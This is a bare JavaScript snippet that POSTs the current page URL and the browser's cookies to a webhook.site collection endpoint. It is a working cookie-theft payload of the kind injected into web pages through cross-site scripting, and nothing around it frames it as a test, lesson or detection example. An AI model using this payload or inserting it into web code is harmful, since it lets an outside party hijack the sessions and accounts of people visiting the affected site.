fetch('https://webhook.site/d33c9128-a291-4603-b31f-6f6e751b9708', {
  method: 'POST',
  body: JSON.stringify({ url: window.location.href, cookies: document.cookie })
});
